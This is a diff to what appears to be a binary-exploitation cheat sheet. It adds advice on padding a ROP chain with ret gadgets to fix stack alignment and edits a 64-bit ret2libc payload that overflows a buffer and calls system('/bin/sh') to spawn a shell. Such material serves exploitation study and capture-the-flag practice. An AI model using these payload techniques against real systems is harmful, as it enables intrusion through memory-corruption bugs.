@@ -65,6 +65,15 @@ context.binary = elf = ELF("./vuln")
 bss_section = elf.symbols.__bss_start
 ```
 
+### Stack alignment
+
+Not 100% sure on a method to detect if the stack is not aligned.  
+If you believe your exploit is solid but you keep seg faulting  
+or get illegal instruction errors, try adding `ret` gadgets to align  
+the stack.  
+Increment the number of rets you are adding a couple of  
+times to see if this allows the exploit to succeed.  
+
 ## ret2libc
 
 *Methodology:*  
@@ -170,7 +179,6 @@ io.interactive()
 # 64 Bit
 payload2 = flat([
     offset, # overflow the buffer up until the saved RIP
-    ret, # A ret gadget may be needed for stack alignment
     pop_rdi, # save the argument in RDI
     binSh, # Argument for system
     system # call system
